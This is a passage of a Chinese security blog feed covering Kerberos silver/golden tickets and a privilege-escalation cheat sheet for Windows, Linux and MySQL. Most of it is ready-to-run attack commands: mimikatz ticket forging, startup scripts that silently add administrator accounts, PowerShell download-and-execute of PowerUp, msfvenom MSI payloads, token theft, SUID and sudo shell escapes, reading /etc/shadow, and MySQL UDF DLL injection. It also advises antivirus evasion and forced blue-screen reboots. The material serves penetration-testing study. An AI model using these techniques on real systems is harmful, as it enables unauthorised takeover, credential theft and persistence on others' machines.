class="hljs-variable">CIFS</span><br><span class="hljs-variable">LDAP</span>                       <span class="hljs-variable">LDAP</span><br><span class="hljs-variable">Windows</span> <span class="hljs-variable">Remote</span> <span class="hljs-variable">Server</span>      <span class="hljs-variable">RPCSS</span>、<span class="hljs-variable">LDAP</span>、<span class="hljs-variable">CIFS</span><br></code></pre></td></tr></table></figure><p>/rc4:域控的计算机账户ntlm hash</p><p>/user:要伪造的用户名(<strong>任意！包括不存在的用户</strong>)</p><p>mimikatz.exe “kerberos::golden /domain:域 /sid:SID /target:域全称 /service:要访问的服务 /rc4:NTLM /user:silver /ptt”即可生成并导入Silver Ticket</p></blockquote><h3 id="黄金票据和白银票据的不同"><a href="#黄金票据和白银票据的不同" class="headerlink" title="黄金票据和白银票据的不同"></a>黄金票据和白银票据的不同</h3><p>访问权限不同：</p><ul><li>黄金票据Golden Ticket：伪造TGT，可以获取任何Kerberos服务权限</li><li>白银票据Silver Ticket：伪造TGS，只能访问指定的服务</li></ul><p>加密方式不同：</p><ul><li>Golden Ticket由krbtgt的Hash加密</li><li>Silver Ticket 由服务账号（通常为计算机账户）Hash加密</li><li>认证流程不同：</li><li>Golden Ticket的利用过程需要访问域控，</li><li>而Silver Ticket不需要</li></ul><p>隐蔽性不同：</p><ul><li>白银票据依赖于服务账号的密码散列值，而黄金票据需要利用krbtgt账号的密码散列值，因此白银票据更隐蔽</li></ul>]]></content>
    
    
    <categories>
      
      <category>内网</category>
      
    </categories>
    
    
    <tags>
      
      <tag>knowledge</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>权限提升</title>
    <link href="/2022/03/27/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/"/>
    <url>/2022/03/27/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/</url>
    
    <content type="html"><![CDATA[<h1 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h1><p><strong>Windows上常见的权限分类：</strong></p><blockquote><p>User：普通用户权限；</p><p>Administrator：管理员权限；</p><p>System：系统权限。</p><p>TrustedInstaller ： windows中最高权限。对系统文件，system 权限也无法修改，只有 TrustedInstaller 权限才能修改。</p></blockquote><p><strong>Linux上权限分类：</strong></p><blockquote><p>User：普通用户权限；</p><p>www-data：Web服务的权限，比User还要低，一般通过Web漏洞获取的Webshell就是这个权限；</p><p>root：Linux系统最高权限。</p></blockquote><p><strong>纵向提权</strong>：低权限角色获取高权限角色的权限。</p><p><strong>横向提权</strong>：在系统A中获取了系统B中同级别的角色权限。</p><h2 id="Win"><a href="#Win" class="headerlink" title="Win"></a>Win</h2><h3 id="内核溢出漏洞提权"><a href="#内核溢出漏洞提权" class="headerlink" title="内核溢出漏洞提权"></a>内核溢出漏洞提权</h3><blockquote><p>systeminfo &gt; 1.txt</p></blockquote><p>寻找未打补丁</p><ul><li><p>在线查询：<a href="https://i.hacking8.com/tiquan/">https://i.hacking8.com/tiquan/</a></p></li><li><p>脚本+表格匹配：<a href="https://github.com/SecWiki/windows-kernel-exploits">https://github.com/SecWiki/windows-kernel-exploits</a></p></li></ul><blockquote><p>python windows-exploit-suggester.py -d xxx-mssb.xls -i 1.txt</p></blockquote><ul><li>ps脚本：<a href="https://github.com/rasta-mouse/Sherlock">Sherlock</a></li></ul><blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">//本地加载<br>Import-Module .\Sherlock.ps1<br><br>//远程加载<br>IEX (New-Object  System.Net.Webclient).DownloadString(<span class="hljs-string">&#x27;https://raw.githubusercontent.com/rasta-mouse/Sherlock/master/Sherlock.ps1&#x27;</span>)<br></code></pre></td></tr></table></figure><p>Find-AllVuls</p></blockquote><ul><li>MSF模块：<code>post/multi/recon/local_exploit_suggester</code>或者<code>post/windows/gather/enum_patches</code>可以快速检测到系统中可利用的漏洞</li></ul><blockquote><p>msf</p><p>search suggester</p><p>use 0</p><p>set session 1</p><p>run</p></blockquote><h3 id="启动项提权"><a href="#启动项提权" class="headerlink" title="启动项提权"></a>启动项提权</h3><ol><li><p>启动项路径：<br> C:\Users\用户名\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup</p></li><li><p>在启动项中创建vbs或bat脚本</p></li></ol><blockquote><p>vbs：<br>  set wshshell=createobject(“wscript.shell”)<br>  a=wshshell.run(“cmd.exe /c net user 用户名 密码  /add”,0)<br>  b=wshshell.run(“cmd.exe /c net localgroup administrators 用户名 /add”,0)<br>bat：<br> net user 用户名 密码 /add<br> net localgroup administrators 用户名 /add</p></blockquote><ol start="3"><li><p>接下来需要等待机器重启并以较大权限的账号登录，暴力一点可以配合漏洞打蓝屏poc强制重启。</p></li><li><p>bat脚本运行时会有个dos弹一下，vbs不会弹，建议使用vbs脚本</p></li></ol><h3 id="系统错误配置提权"><a href="#系统错误配置提权" class="headerlink" title="系统错误配置提权"></a>系统错误配置提权</h3><p>windwos系统服务文件在操作系统启动时加载和执行，并在后台调用执行文件。因此，如果一个低权限用户对此类系统服务调用的可执行文件拥有写权限，就可以将该文件替换成任意可执行文件，并随着系统服务的启动获得系统权限。</p><p>windwos服务是以 system 权限运行的，因此，其文件夹、文件和注册表键值都是受强访问机制保护的。但是，在某些情况下，操作系统中仍然存在一些没有得到有效保护的服务。</p><p>系统服务权限配置错误(可写目录漏洞)有如下两种可能：</p><ol><li><p>服务未运行：攻击者会使用任意服务替换原来的服务，然后重启服务</p></li><li><p>服务正在运行且无法被终止：这种情况符合绝大多数的漏洞利用场景，攻击者通常会利用 DLL 劫持技术并尝试重启服务来提权。</p></li></ol><ul><li><a href="https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1">PowerUP</a></li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">powershell.exe -<span class="hljs-built_in">exec</span> bypass -Command <span class="hljs-string">&quot;&amp; &#123;Import-Module c:\PowerUp.ps1; Invoke-AllChecks&#125;&quot;</span><br><br>powershell.exe -nop -<span class="hljs-built_in">exec</span> bypass -c <span class="hljs-string">&quot;IEX (New-Object Net.WebClient).DownloadString(&#x27;https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1&#x27;); Invoke-AllChecks&quot;</span><br></code></pre></td></tr></table></figure><ul><li>MSF中的<code>exploit/windows/local/service_permissions</code>服务提权模块可以返回一个system权限</li></ul><blockquote><p>set SESSION</p><p>run</p></blockquote><p>模块使用两种方法获得system权限：如果meterpreter以管理员权限运行，该模块尝试创建并运行一个新的服务，如果当前权限不允许创建服务，该模块会判断哪些服务或者文件夹的权限有问题，并对其进行劫持。在创建服务或者劫持已经存在的服务时，该模块会创建一个可执行文件 ，文件名和安装路径随机</p><ul><li>注册表键AlwayslnstallElevated</li></ul><p><code>注册表键AlwayslnstallElevated</code>是一个策略设置项。Windows允许低权限用户以syetem权限运行安装文件。如果启动此策略设置项，那么任何权限的用户都能以<code>NT AUTHORITY\SYSTEM</code>权限来安装恶意的MSI文件</p><p>使用PowerUP的<code>Get-RegistryAlwaysInstallElevated</code>模块来检测注册表是否被设置。如果 AlwaysInstallElevated 注册表项被设置，意味着的 MSI 文件是以 system 权限运行的，True 表示已经设置，命令如下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">powershell -nop -<span class="hljs-built_in">exec</span> bypass IEX(New-Object Net.WebClient).DownloadString(<span class="hljs-string">&#x27;C:\Users\Admin\Desktop\PowerUp\PowerUp\PowerUp.ps1&#x27;</span>);Get-RegistryAlwaysInstallElevated<br></code></pre></td></tr></table></figure><p>也可用注册表查看</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated<br>reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated<br></code></pre></td></tr></table></figure><p>生成恶意的MSI安装文件，让其来添加用户，使用<code>PowerUp</code>脚本自带的 <code>Write-UserAddMSI</code>模块，运行后生成文件 <code>UserAdd.msi</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">powershell -nop -<span class="hljs-built_in">exec</span> bypass IEX(New-Object Net.WebClient).DownloadString(<span class="hljs-string">&#x27;C:\Users\Admin\Desktop\PowerUp\PowerUp\PowerUp.ps1&#x27;</span>);Write-UserAddMSI<br></code></pre></td></tr></table></figure><p>以普通权限运行UserAdd.msi，下面这个运行后还需要点击Greate，更方便的是直接在桌面上进行双击确定,成功添加用户</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">msiexec /q /i UserAdd.msi<br></code></pre></td></tr></table></figure><p>另外的方式是可以使用msf生成木马，进行上传运行，实战记得免杀</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">msfvenom -f msi -p windows/adduser USER=qing PASS=123P@ss! -o /root/msi.msi<br>upload /root/msi.msi c:\\msi.msi <br></code></pre></td></tr></table></figure><p>msiexec工具参数：</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli"><span class="hljs-string">/quiet</span>:在安装过程中禁止向用户发送消息<br><span class="hljs-string">/qn</span>:不实用图形界面<br><span class="hljs-string">/i</span>:安装程序<br></code></pre></td></tr></table></figure><p>也可利用metasploit的<code>exploit/windows/local/always_install_elevated</code>模块完成以上的操作，会返回一个system权限的mterpreter。这个模块会创建一个文件名随机的MSI文件，提权后自动删除已部署的文件。</p><ul><li>可信任服务路径漏洞</li></ul><p>如果一个服务的可执行文件的路径没有被双引号引起来且包含空格，那么这个服务就是有漏洞的。</p><p>原理：对于C:\Program Files\Some Folder\Service.exe文件路径中的每一个空格，windows都会尝试寻找并执行名字与空格前的名字向匹配的程序。操作系统会对文件路径中空格的所有可能进行尝试，直到找到一个匹配的程序。以上面的例子为例，windows会依次尝试确定和执行下面的程序：</p><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs livescript">C:<span class="hljs-string">\Program.exe</span><br>C:<span class="hljs-string">\Program</span> Files<span class="hljs-string">\Some.exe</span><br>C:<span class="hljs-string">\Program</span> Files<span class="hljs-string">\Some</span> Folder<span class="hljs-string">\Service.exe</span><br></code></pre></td></tr></table></figure><p>所以如果我们能够上传一个适当命名的恶意可执行程序在受影响的目录，比如这里我把木马名字改了Program.exe，放在c盘小,一旦此服务重启，因为优先级的缘故，服务会优先选择我们木马Program.exe，而不是C:\Program Files\Some Folder\Service.exe，那么我们的恶意程序就会以system权限运行(大多数情况下)。</p><p>该漏洞存在如下两种可能性：</p><ol><li><p>如果路径与服务有关，就任意创建一个服务或者编译Serviec模版</p></li><li><p>如果路径与可执行文件有关，就任意创建一个可执行文件</p></li></ol><p>检测使用wmic命令，列出目标机器中所有没有被引号引起来的服务</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">wmic service get name,displayname,pathname,startmode |findstr /i <span class="hljs-string">&quot;Auto&quot;</span> |findstr /i /v <span class="hljs-string">&quot;C:\Windows\\&quot;</span> |findstr /i /v <span class="hljs-string">&quot;&quot;</span><span class="hljs-string">&quot;</span><br></code></pre></td></tr></table></figure><p>通过显示出来的服务路径有没有被引号引起来，且路径是否包含空格来判断目标机器上是否存在可信任服务路径漏洞。</p><ul><li><input checked="" disabled="" type="checkbox"> 手动写入</li></ul><p>下一步是检测目标文件是否有写权限。可使用Windows内置工具</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">icacls <span class="hljs-string">&quot;路径&quot;</span><br>accesschk -dqv <span class="hljs-string">&quot;路径&quot;</span> -accepteula<br></code></pre></td></tr></table></figure><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs makefile"><span class="hljs-section">Everyone:用户对这个文件夹有完全控制权限</span><br><span class="hljs-section">（M）:修改</span><br><span class="hljs-section">（F）: 完全控制</span><br><span class="hljs-section">（CI）: 从属容器将继承访问控制项</span><br><span class="hljs-section">（OI）:从属文件将继承访问控制项</span><br><span class="hljs-section">Everyone:(OI)(CI)(F)意思是对该文件夹，用户有读写、删除其下文件、删除其子目录的权限</span><br></code></pre></td></tr></table></figure><p>确认漏洞后，要上传的程序<code>重命名</code>并放置在存在此漏洞且可写的目录下，执行如下命令，尝试重启服务</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">sc stop service_name<br>sc start service_name<br></code></pre></td></tr></table></figure><ul><li><input checked="" disabled="" type="checkbox"> 使用msf</li></ul><blockquote><p>use exploit/windows/local/trust_service_path</p><p>set AutoRunScript migrate -f</p></blockquote><ul><li>自动安装配置文件</li></ul><p><code>post/windows/gather/enum_unattend</code>会遍历inf、xml等文件获取账号密码</p><ul><li>计划任务</li></ul><p>域渗透的时候可以关注一下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">schtasks /query /fo LIST /v<br></code></pre></td></tr></table></figure><h3 id="组策略首选项提权"><a href="#组策略首选项提权" class="headerlink" title="组策略首选项提权"></a>组策略首选项提权</h3><p>在一般的域环境中，所有机器都是脚本化批量部署的，数据量通常很大。为了方便管理，管理员往往会使用域策略进行统一的配置和管理。大多数组织在创建域环境后，会要求加入域的计算机使用域用户密码进行登录验证。为了保证本地管理员密码的安全性，这些组织的网络管理员往往会修改本地管理员密码</p><p>就算如此，安全问题依旧存在。通过组策略统一修改的密码，虽然强度有所提高，但所有机器的本地管理员密码是相同的。在通过一台机器的本地管理员密码，就相当于获得了整个域中所有机器的本地管理员密码</p><p>常见的组策略首选项（Group Policy Preferences）列举如下：</p><ol><li>映射驱动器（Drives.xml）</li><li>创建本地用户</li><li>数据源(DataSources.xml)</li><li>打印机配置(Printers.xml)</li><li>创建/更新服务(Services.xml)</li><li>计划任务(ScheduledTasks.xml)</li></ol><p><code>SYSVOL</code>是活动后目录里面的一个用于存储域公共文件服务器副本的共享文件夹，在域中所有域控制器之间进行复制。SYSVOL文件夹是在安装活动目录时自动创建的，主要用来存放登录脚本、组策略数据及其他域控制器需要的域信息等。SYSVOL在所有经过身份验证的域用户或者域信任用户具有读写权限的活动目录的域范围内共享。整个SYSVOL目录所在的域控制器中是自动同步和共享的，所有的策略均存放在<code>C:\Windows\SYSVOL\DOMAIN\Policies</code>目录中</p><h3 id="UAC提权"><a href="#UAC提权" class="headerlink" title="UAC提权"></a>UAC提权</h3><p>UAC是为微软为提高系统安全性在Windows  Vista中引入的技术。UAC的要求用户在执行可能影响计算机运行的操作或者在进行可能影响其他用户的设置之前，拥有相应的权限或者管理员密码。UAC在操作启动前对用户身份进行验证，以避免恶意软件和间谍软件在未经许可的情况下在计算机上安装操作或者对计算机设置进行更改。</p><p>在Windows Vista及更高版本的操作系统中，微软设置了安全控制策略，分为<code>高、中、低</code>三个等级。高等级的进程有<code>管理员权限</code>；中等级的进程有<code>普通用户权限</code>；低等级的进程，权限是有限的，以保证在收到安全威胁时造成的损害最小。</p><p>需要UAC的授权才能进行的操作列表如下</p><ol><li>配置Windows Update</li><li>增加/删除账户</li><li>更改账户类型</li><li>更改UAC的设置</li><li>安装ActiveX</li><li>安装/卸载程序</li><li>安装设备驱动程序</li><li>将文件移动/入职到Program Files 或windows等目录下</li><li>查看其他用户的文件夹</li></ol><p>UAC有如下四种设置要求</p><ol><li>始终通知：这是最安全的设置，没当有程序需要使用高级别的权限时都会提示本地用户</li><li>仅在程序试图更改我的计算机时通知我：这是UAC的默认设置。当本地windows程序要使用高级别的权限时，不会通知用户。但是，当第三方程序要使用高级别的权限时，会提示本地用户</li><li>仅在程序试图更改我的计算机时通知我(不降低桌面的亮度)：与上一条设置的要求相同，但在提示用户时不降低桌面的亮度</li><li>从不提示：当用户为管理员时，所有程序会以最高权限运行</li></ol><p>bypassuac模块：</p><ul><li>exploit/windows/local/bypassuac模块</li><li>exploit/windows/local/bypassuac_injection模块</li><li>exploit/windows/local/ask模块 需要管理员权限进行交互</li></ul><h3 id="令牌窃取"><a href="#令牌窃取" class="headerlink" title="令牌窃取"></a>令牌窃取</h3><p><code>令牌（Token）</code>是指系统中的临时密钥，相当于账号和密码，用于决定是否允许当前请求及判断当前请求是属于哪个用户的。获得了令牌，就可以在不提供密码或其他凭证的情况下访问网络和系统资源。令牌将持续存在于系统中，除非系统重新启动</p><p>令牌的最大特点是随机性和不可预测性。<code>访问令牌（Access Token）</code>代表访问控制操作主题的系统对象。<code>密保令牌（Security Token）</code>也叫作认证令牌或者硬件令牌，是一种实现计算机身份校验的物理设备，入U盾。<code>会话令牌（Session Token）</code>是交互会话中唯一的身份标识符</p><p>伪造令牌的攻击的核心是<code>kerberos</code>协议。kerberos是一种网络认证协议，其设计目标是通过密钥系统为客户机/服务器应用程序提供强大的认真服务</p><p>有两种类型的令牌：一种是<code>Delegation Tokens</code>是为授权令牌，支持交互式的登录，如可远程登录访问等；另一种是<code>Impersonation Tokens</code>是模拟令牌，支持非交互式的会话。令牌的数量取决于meterpreter shell的访问级别。如果是一个系统管理员的令牌，则可以直接伪造这个令牌，使攻击者拥有它的权限</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">list_tokens -u                           //列出令牌<br>impersonate_token <span class="hljs-string">&quot;NT AUTHORITY\\SYSTEM&quot;</span> //窃取令牌<br>steal_token 1234                         //从进程窃取令牌<br>rev2self                                 //返回到之前的AccessToken权限<br></code></pre></td></tr></table></figure><p>有独立的可执行<a href="https://labs.mwrinfosecurity.com/assets/BlogFiles/incognito2.zip">文件</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">incognito.exe list_tokens -u                            //列举令牌<br>incognito.exe execute -c <span class="hljs-string">&quot;NT AUTHORITY\SYSTEM&quot;</span> cmd.exe  //窃取令牌执行cmd.exe，此时可以配合木马<br></code></pre></td></tr></table></figure><ul><li>窃取TrustedInstaller令牌</li></ul><p>启动服务</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sc.exe start TrustedInstaller<br></code></pre></td></tr></table></figure><p>窃取令牌</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">use incognito<br>ps                    //找到TrustedInstaller的进程PID<br>steal_token 1234      //从该进程中窃取令牌<br>getuid   <br></code></pre></td></tr></table></figure><ul><li>配合烂土豆</li></ul><p>C#版的烂土豆（来自QAX零队） </p><p>实测Win7、Win8、08、12等可用</p><p>项目地址：<a href="https://github.com/uknowsec/SweetPotato">https://github.com/uknowsec/SweetPotato</a></p><p>直接在Webshell下执行</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">SweetPotato.exe -a whoami<br></code></pre></td></tr></table></figure><p>其他的版本：</p><p><a href="https://github.com/SecWiki/windows-kernel-exploits/blob/master/MS16-075/potato.exe">https://github.com/SecWiki/windows-kernel-exploits/blob/master/MS16-075/potato.exe</a></p><p>上传potato</p><blockquote><p>execute -cH -f potato.exe<br>impersonate_token “NT AUTHORITY\SYSTEM”</p></blockquote><p><a href="https://github.com/foxglovesec/RottenPotato">https://github.com/foxglovesec/RottenPotato</a>  //需要编译</p><p><a href="https://github.com/breenmachine/RottenPotatoNG/blob/master/RottenPotatoEXE/x64/Release/MSFRottenPotato.exe">https://github.com/breenmachine/RottenPotatoNG/blob/master/RottenPotatoEXE/x64/Release/MSFRottenPotato.exe</a>  </p><h3 id="DLL劫持"><a href="#DLL劫持" class="headerlink" title="DLL劫持"></a>DLL劫持</h3><p>Windows程序启动的时候需要DLL。如果这些DLL 不存在，则可以通过在应用程序要查找的位置放置恶意DLL来提权。通常，Windows应用程序有其预定义好的搜索DLL的路径，它会根据下面的顺序进行搜索：</p><blockquote><p>C:\Windows\System32<br>C:\Windows\System<br>C:\Windows<br>当前工作目录Current Working Directory，CWD<br>在PATH环境变量的目录（先系统后用户）</p></blockquote><p>收集进程加载了哪些dll，可以上传单机版的火绒剑，进程里面系统文件没有权限无法更改，选择数字签名文件或未知文件，msf生成木马dll进行替换</p><h2 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h2><h3 id="内核溢出漏洞提权-1"><a href="#内核溢出漏洞提权-1" class="headerlink" title="内核溢出漏洞提权"></a>内核溢出漏洞提权</h3><blockquote><p>uname -a</p><p>hostnamectl</p><p>lsb_release -a</p></blockquote><p><a href="https://github.com/SecWiki/linux-kernel-exploits">https://github.com/SecWiki/linux-kernel-exploits</a></p><p><a href="https://github.com/offensive-security/exploitdb">https://github.com/offensive-security/exploitdb</a></p><p><a href="https://www.exploit-db.com/">https://www.exploit-db.com/</a></p><p><a href="https://github.com/SecWiki/macos-kernel-exploits">mac</a></p><h3 id="定时任务提权"><a href="#定时任务提权" class="headerlink" title="定时任务提权"></a>定时任务提权</h3><blockquote><p>crontab -l //列出定时任务</p><p>//查看定时任务</p><p>/etc/crontab</p><p>/var/spool/cron/crontabs</p><p>/etc/cron.*/</p></blockquote><ol><li>定时任务以root或高权限用户运行</li><li>拿到的低权限用户对定时文件有写文件的权限</li></ol><p>然后步骤就是写进定时任务，反弹shell等</p><h3 id="SUID提权"><a href="#SUID提权" class="headerlink" title="SUID提权"></a>SUID提权</h3><p><a href="https://blog.csdn.net/shuteer_xu/article/details/104912790?utm_term=SUID%E6%8F%90%E6%9D%83%20%E5%88%A9%E7%94%A8%E5%A4%B1%E8%B4%A5&utm_medium=distribute.pc_aggpage_search_result.none-task-blog-2~all~sobaiduweb~default-0-104912790&spm=3001.4430">具体</a></p><p>SUID 是一种特殊的文件属性，它允许用户执行的文件以该文件的拥有者的身份运行，ls 查看时有 s 属性才支持 SUID</p><p>查找系统中可使用root权限运行的命令：</p><blockquote><p> find / -user root -perm -4000 -print 2&gt;/dev/null<br> find / -perm -u=s -type f 2&gt;/dev/null<br> find / -user root -perm -4000 -exec ls -ldb {} ;</p><figure class="highlight haml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs haml">-<span class="ruby">perm 表示搜索随后的权限</span><br><span class="ruby"></span>-<span class="ruby">u = s表示查找root用户拥有的文件</span><br><span class="ruby"></span>-<span class="ruby"><span class="hljs-string">``</span>type<span class="hljs-string">``</span>表示我们正在寻找的文件类型</span><br><span class="ruby"></span>f 表示常规文件，而不是目录或特殊文件<br>2表示该进程的第二个文件描述符，即stderr（标准错误）<br></code></pre></td></tr></table></figure></blockquote><p>常用的命令并且可能具有<strong>S</strong>权限有：</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-keyword">nmap</span><br><span class="hljs-keyword">vim</span><br><span class="hljs-keyword">find</span><br>bash<br>more<br>less<br>nano<br><span class="hljs-keyword">cp</span><br>awk<br></code></pre></td></tr></table></figure><p>利用方式：</p><blockquote><p>Nmap(2.02-5.21)<br> nmap –interactive<br> !sh</p><p>find<br> touch pentestlab<br> find pentestlab -exec whoami ;</p><p>less/more<br> less(more) /etc/passwd<br> !/bin/sh</p><p>vim/vi<br> vim.tiny<br> :set shell=/bin/sh<br> :shell</p><p>git<br> git help config<br> !/bin/bash</p></blockquote><h3 id="sudo权限绕过"><a href="#sudo权限绕过" class="headerlink" title="sudo权限绕过"></a>sudo权限绕过</h3><p>cve-2019-14287，sudo &lt; 1.8.28</p><blockquote><p>sudo -l</p><p>sudo awk ‘BEGIN{system(“/bin/sh”)}’</p><p>sudo curl file:///etc/shadow</p><p><strong>sudo -u#-1whoami</strong></p></blockquote><h3 id="su-root被禁止登录（获取交互shell）"><a href="#su-root被禁止登录（获取交互shell）" class="headerlink" title="su root被禁止登录（获取交互shell）"></a>su root被禁止登录（获取交互shell）</h3><blockquote><p>拿到 root 密码，端口转发，代理，但防火墙禁止其他人登录 root；</p><p>用原来的低权限 shell，也无法 sudo 切换 root</p><p>因为出于安全考虑，linux 要求用户必须从终端设备（tty）中输入密码，而不是标准输入（stdin）</p><p>所以 sudo 在你输入密码的时候本质上是读取了键盘，而不是读取 bash 里面输入的字符</p></blockquote><p>利用python获取交互Shell</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">python -c <span class="hljs-string">&#x27;import pty;pty.spawn(&quot;/bin/sh&quot;)&#x27;</span><br>sudo su<br></code></pre></td></tr></table></figure><h2 id="Mysql"><a href="#Mysql" class="headerlink" title="Mysql"></a>Mysql</h2><h3 id="UDF提权"><a href="#UDF提权" class="headerlink" title="UDF提权"></a>UDF提权</h3><p>UDF（user defined function）用户自定义函数，是mysql的一个拓展接口。用户可以通过自定义函数实现在mysql中无法方便实现的功能，其添加的新函数都可以在sql语句中调用，就像调用本机函数一样</p><p><strong>条件：</strong></p><blockquote><p>如果mysql版本大于5.1，udf.dll文件必须放置在mysql安装目录的lib\plugin文件夹下/，该目录默认不存在，需要创建后上传udf.dll</p><p>如果mysql版本小于5.1， udf.dll文件在windows server 2003下放置于c:\windows\system32目录，在windows server 2000下放置在c:\winnt\system32目录</p><p>掌握mysql数据库的账户，从拥有对mysql的insert和delete权限，以创建和抛弃函数</p><p>拥有可以将udf.dll写入相应目录的权限</p></blockquote><p><strong>利用：</strong></p><p>mysql内查找插件安装目录：</p><blockquote><p>show variables like %plugin%</p></blockquote><p>目录是否可写：</p><blockquote><p>show variables like ‘%secure_file_priv%’</p></blockquote><p>udf.dll文件可以在sqlmap里面找：</p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220330184744211.png"></p><p>sqlmap中的udf.dll经过异或编码，需要解码</p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220330210702070.png"></p><blockquote><p>python3 cloak.py -d -i lib_mysqludf_sys.dll</p></blockquote><p>将解码后的dll文件复制到<code>mysql/lib/plugin</code></p><p>创建函数：</p><blockquote><p>create function sys_exec returns string soname “lib_mysqludf_sys.dll”;</p><p>create function sys_eval returns string soname “lib_mysqludf_sys.dll”;</p></blockquote><p>其他可用函数如下：</p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220330211359783.png"></p><p>利用：</p><blockquote><p>select sys_exec(‘whoami’);</p><p>select sys_eval(‘whoami’);</p></blockquote><p>删除函数：</p><blockquote><p>DROP function sys_exec;</p><p>DROP function sys_eval;</p></blockquote><p>linux对应的是so文件</p><p>这些dll/so文件还可以在Metasploit的/usr/share/metasploit-framework/data/exploits/mysql目录下找到</p><ul><li>数据流写入</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">create table temp(data longblob);<br>insert into temp(data) values (0x4d5a90000300000004000000ffff0000b800000000000000400000000000000000000000000000000000000000000000000000000000000000000000f00000000e1fba0e00b409cd21b8014ccd21546869732070726f6772616d2063616e6e6f742062652072756e20696e20444f53206d6f64652e0d0d0a2400000000000000000000000000000);<br>update temp <span class="hljs-built_in">set</span> data = concat(data,0x33c2ede077a383b377a383b377a383b369f110b375a383b369f100b37da383b369f107b375a383b35065f8b374a383b377a382b35ba383b369f10ab376a383b369f116b375a383b369f111b376a383b369f112b376a383b35269636877a383b300000000000000000000000000000000504500006486060070b1834b00000000);<br>select data from temp into dumpfile <span class="hljs-string">&quot;G:\\phpstudy_pro\\Extensions\\MySQL5.7.26\\lib\\plugin\\udf.dll&quot;</span>;<br>create <span class="hljs-keyword">function</span> sys_eval returns string soname <span class="hljs-string">&#x27;udf.dll&#x27;</span>;   <span class="hljs-comment">#创建函数sys_eval</span><br></code></pre></td></tr></table></figure><p><a href="https://blog.csdn.net/qq_36119192/article/details/84863268">详情</a></p><ul><li>使用MSF中的<code>exploit/multi/mysql/mysql_udf_payload</code>模块也可以进行UDF提权，但是前提是可以使用账号密码进入mysql以及存在对应目录，msf创建的UDF函数默认是<code>sys_exec()</code>没有回显，如下创建<code>sys_eval()</code></li></ul><blockquote><p>select * from mysql.func where name = “sys_eval”;</p><p>create function sys_eval 